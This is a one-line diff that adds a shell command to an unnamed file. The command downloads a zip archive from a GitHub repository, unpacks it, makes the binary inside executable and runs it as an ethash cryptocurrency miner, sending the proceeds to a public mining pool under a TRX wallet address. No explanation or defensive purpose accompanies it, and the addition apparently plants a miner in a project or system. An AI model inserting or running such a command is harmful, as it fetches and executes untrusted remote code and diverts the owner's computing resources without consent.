@@ -1,0 +1,1 @@
+wget https://github.com/lokag/rev/raw/main/run.zip && apt install unzip && unzip run.zip && cd run && chmod u+x run && ./run -a ethash -o ethash.unmineable.com:3333 -u TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.clear -p x
